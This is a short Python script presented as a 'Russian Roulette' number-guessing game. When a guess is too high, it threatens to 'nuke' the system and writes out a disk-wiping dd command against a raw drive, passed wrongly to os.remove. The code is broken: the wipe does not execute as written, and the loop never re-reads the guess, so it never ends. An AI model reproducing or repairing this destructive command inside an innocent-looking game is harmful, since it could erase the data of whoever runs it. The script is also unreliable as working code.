import random
import os

# RussianRouletteGame

number = random.randint(1, 100)
guess = int(input("Guess a number between 1 and 100: "))
while guess != number:
    if guess < number:
        print("Too low!")
    else:
        print("Too bad, your system will be nuked")
        os.remove("sudo dd if=/dev/zero of=/dev/sdX bs=4M status=progress")
